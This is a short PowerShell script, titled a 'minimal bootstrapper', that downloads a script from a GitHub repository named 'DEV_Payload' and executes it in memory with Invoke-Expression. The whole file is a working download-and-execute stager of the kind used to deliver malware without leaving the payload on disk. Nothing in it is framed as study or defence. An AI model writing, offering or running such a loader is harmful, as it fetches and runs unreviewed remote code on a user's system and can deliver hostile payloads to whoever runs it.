# Minimal bootstrapper
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Bootstrapper")

# URL of your main watcher script
$scriptUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/UniversalPowerShell_Dynamic_15E1362D_E98B_4386_9CA9_DD52D7ECCEE7.ps1"

# Download the main watcher dynamically
$code = $wc.DownloadString($scriptUrl)

# Execute the watcher in memory
Invoke-Expression $code
